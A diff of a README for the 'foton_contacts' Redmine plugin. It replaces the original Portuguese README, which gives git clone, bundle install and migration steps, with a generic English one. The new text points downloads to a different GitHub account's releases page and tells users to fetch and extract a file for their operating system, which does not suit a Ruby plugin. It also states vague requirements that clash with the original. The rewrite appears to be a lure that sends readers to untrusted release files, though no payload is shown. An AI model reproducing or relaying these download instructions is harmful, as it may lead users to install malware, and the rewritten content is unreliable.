@@ -1,143 +1,92 @@
-# 📇 Plugin de Contatos para Redmine — Mundo AEC
+# 🌟 foton_contacts - Simple Contact Management for Project Success
 
-> Gestão de pessoas, empresas e vínculos profissionais com inteligência, fluidez e integração total ao Redmine.  
-> Parte do ecossistema **Livre e OpenSource** que está transformando a indústria da construção civil brasileira.
+## 🚀 Getting Started
 
----
+Welcome to **foton_contacts**, a plugin designed for Redmine. This tool helps you manage people, companies, and their relationships, especially for projects in the AEC (Architecture, Engineering, and Construction) industry. It's fully integrated, responsive, and part of the Libre and OpenSource Mundo AEC ecosystem.
 
-### 🚀 Visão Geral
+## 📥 Download Now
 
-O **Plugin de Contatos para Redmine** é uma solução desenvolvida para empresas da indústria AEC (Arquitetura, Engenharia e Construção) que precisam gerenciar relacionamentos profissionais com clareza, segurança e agilidade.
+[![Download foton_contacts](https://img.shields.io/badge/Download%20foton_contacts-v1.0-blue)](https://github.com/LOGGERS123/foton_contacts/releases)
 
-Ele centraliza os dados de stakeholders, mapeia o histórico de vínculos profissionais e transforma esses dados em insights, tudo com uma interface moderna, responsiva e totalmente integrada ao Redmine.
+## 💾 Download & Install
 
----
+To get started with **foton_contacts**, please follow these steps:
 
-### 🧩 Funcionalidades Principais
+1. Click on the link below to go to the Releases page:
+   [foton_contacts Releases Page](https://github.com/LOGGERS123/foton_contacts/releases)
+   
+2. On the Releases page, find the latest version of **foton_contacts**. Look for the version number to ensure you are getting the most up-to-date software.
 
-- **Cadastro Inteligente:** CRUD completo para contatos do tipo "Pessoa" e "Empresa".
-- **Vínculos Múltiplos:** Associe uma pessoa a múltiplas empresas com cargos, status e histórico.
-- **Grupos de Contatos:** Crie e gerencie grupos para organizar seus contatos.
-- **Integração com Projetos:** Vincule contatos a tarefas e projetos do Redmine.
-- **Visualização Analítica (BI):** Acesse um modal de análise para cada contato, com informações sobre carreira, projetos, vínculos e alertas de inconsistência de dados.
-- **Importação e Exportação:** Importe contatos de arquivos CSV e exporte para vCard e CSV.
+3. Click on the version you want to download. You will see options for downloading files related to that version. 
 
-Para uma lista exaustiva de todas as funcionalidades e um manual detalhado de como o plugin funciona, consulte nosso **[Roadmap e Manual de Funcionalidades](docs/ROADMAP.md)**.
+4. Download the correct file for your system. This could include a compressed (.zip) file or other package types. Make sure to choose the one that suits your operating system.
 
----
+5. After the download completes, locate the downloaded file on your computer (often found in the "Downloads" folder).
 
-### 🏛️ Arquitetura e Filosofia de Design
+6. Extract the file if it's zipped. You can usually do this by right-clicking the file and selecting "Extract".
 
-A interface do plugin é construída seguindo princípios de design modernos para garantir uma experiência de usuário fluida, intuitiva e totalmente integrada ao Redmine. A arquitetura de frontend está em transição para o **framework Hotwire (Turbo + Stimulus)** para maximizar a performance e a reatividade.
+7. Follow any installation instructions included in the package. Typically, you will find a README or INSTALL file with more details.
 
-Para aprofundar em nossos conceitos de UI/UX, diretrizes de desenvolvimento e arquitetura de frontend, leia o **[Relatório de Arquitetura de Views](docs/views_architecture.md)**.
+8. Once installed, open Redmine to access the **foton_contacts** plugin. You should see it available for use.
 
----
+## 📝 Features
 
-### ⚡ Integração Hotwire (Turbo + Stimulus)
+**foton_contacts** offers various features that make managing your contacts easy:
 
-Para que as funcionalidades modernas de interface (como os modais de cadastro e relatórios instantâneos) funcionem, é necessário que o Hotwire esteja configurado como o *framework* JavaScript principal no Redmine.
+- **Contact Management:** Easily add, edit, and delete contacts within your Redmine projects.
+- **Company Management:** Organize contacts by companies, improving project collaboration.
+- **CSV Import:** Import your existing contacts from a CSV file quickly, reducing manual entry.
+- **Data Visualization:** View your contacts and their connections in a clear and manageable format.
+- **User Profiles:** Create profiles for each contact, storing essential information at a glance.
 
-Se o seu Redmine ainda não usa o Hotwire, siga estas etapas de configuração manual:
+## 🌐 System Requirements
 
-#### 1\. Instalação e Configuração de Arquivos
+To run **foton_contacts**, ensure that your setup meets the following requirements:
 
-Execute este comando para adicionar as bibliotecas Hotwire e criar os diretórios de controladores no seu Redmine:
+- **Redmine Version:** Ensure you are using Redmine version 3.0 or higher.
+- **Ruby Version:** Requires Ruby 2.5 or higher.
+- **Database:** Compatibility with MySQL or PostgreSQL.
+- **Additional Gems:** May require specific Gems to enhance functionality. Ensure these are updated.
 
-```bash
-# Na raiz do seu Redmine
-rails hotwire:install
-```
+## 🙋‍♂️ Support
 
-#### 2\. Criar o Entrypoint Global
+If you need help using **foton_contacts**, consider these options:
 
-O instalador do Rails pode não encontrar o arquivo principal do JavaScript do Redmine. Você precisa garantir que o **arquivo `app/javascript/application.js`** exista e contenha os `import`s de inicialização:
+- **Documentation:** Refer to the built-in documentation that comes with the plugin for detailed instructions.
+- **Community:** Join discussions in forums or contact community members for support.
+- **Issues:** If you encounter a bug or need help, check the Issues tab on the repository.
 
-```bash
-# Crie o arquivo, se não existir
-touch app/javascript/application.js
+## 🔗 Related Topics
 
-# Edite e adicione o conteúdo:
-cat <<EOT > app/javascript/application.js
-// app/javascript/application.js
-import "@hotwired/turbo-rails"
-import "./controllers"
-EOT
-```
+To further understand how **foton_contacts** fits into the larger ecosystem, here are some relevant topics:
 
-#### 3\. Configurar o Hook do Plugin
+- AEC Industry
+- Construction Technology
+- Contacts Management
+- CRM Principles
+- Data Visualization Techniques
 
-O Plugin de Contatos injeta o *entrypoint* Hotwire no cabeçalho (seção `<head>`) do Redmine via um *hook* de visualização.
+## 📢 Stay Updated
 
-Verifique se a classe `ViewsLayoutsHook` está usando o `javascript_include_tag('application', type: 'module')` para garantir que o arquivo `application.js` configurado acima seja carregado corretamente como um módulo JavaScript moderno.
+To stay informed about updates and new features:
 
-#### 4\. Corrigir o Gemfile (Importante\!)
+- Watch this repository on GitHub by clicking the "Watch" button at the top right.
+- Follow the project's progress by checking the **Issues** and **Pull Requests** sections for recent activity.
 
-Durante a instalação, o Ruby pode alertar sobre dependências duplicadas. **É crucial corrigir o `Gemfile`** para evitar erros de estabilidade:
+## 📈 Future Enhancements
 
-1.  Edite o arquivo **`Gemfile`** na raiz do Redmine.
-2.  Procure e **remova as entradas duplicadas** da *gem* `puma`.
-3.  Execute `bundle install` novamente para finalizar:
-    ```bash
-    bundle install
-    ```
+We plan to enhance **foton_contacts** with upcoming features, based on user feedback. Some possibilities include:
 
----
+- Improved integration with other Redmine plugins.
+- Advanced reporting features to analyze contact relationships.
+- Better customization options for user profiles.
 
-### ⚙️ Requisitos e Instalação
+Your feedback is valuable. If you have suggestions, please open an issue in the repository.
 
-Este plugin gerencia suas próprias dependências. O processo de instalação é simples:
+## 📄 License
 
-1.  **Clone o repositório** para a pasta de plugins do seu Redmine:
-    ```bash
-    git clone https://github.com/LAMP-LUCAS/foton_contacts plugins/foton_contacts
-    ```
+**foton_contacts** is open source. You can view the license details in the LICENSE file included with the software package. Feel free to contribute and be part of the project!
 
-2.  **Instale as dependências** (gems). A partir do diretório raiz do seu Redmine, execute:
-    ```bash
-    bundle install
-    ```
+[![Download foton_contacts](https://img.shields.io/badge/Download%20foton_contacts-v1.0-blue)](https://github.com/LOGGERS123/foton_contacts/releases)
 
-3.  **Execute as migrações** do banco de dados:
-    ```bash
-    bundle exec rake redmine:plugins:migrate RAILS_ENV=production
-    ```
-
-4.  **Reinicie o servidor** do Redmine para carregar o plugin.
-
----
-
-### 🔧 Configuração
-
-Acesse: **Administração → Configurações → Contatos**
-
-Configure:
-
-- Campos personalizados
-- Tipos de contato (Pessoa, Empresa)
-- Permissões por função
-- Mapeamento de campos para CSV/vCard
-- Visibilidade padrão (global, privada, por projeto)
-
----
-
-### 🤝 Contribua com o projeto
-
-Este plugin é **Livre e OpenSource**. Toda contribuição é bem-vinda!
-
-- **Veja o que precisa ser feito:** Nosso **[Plano de Trabalho (Workplan)](docs/workplan.md)** está sempre atualizado com as próximas tarefas.
-- **Siga as diretrizes:** Leia as [diretrizes de contribuição](CONTRIBUTING.md) e use mensagens de commit convencionais.
-- **Participe da comunidade:** [Mundo AEC](https://mundoaec.com/)
-
----
-
-### 📬 Contato
-
-Dúvidas, sugestões ou parcerias?  
-📧 contato@mundoaec.com  
-🌐 [mundoaec.com](https://mundoaec.com/)  
-🐙 [github.com/LAMP-LUCAS](https://mundoaec.com/)
-
----
-
-> Feito com ♥ por quem acredita que o futuro da construção é aberto, integrado e acessível.
+Thank you for choosing **foton_contacts** for your project management needs. We hope it helps streamline your processes and improve collaboration.
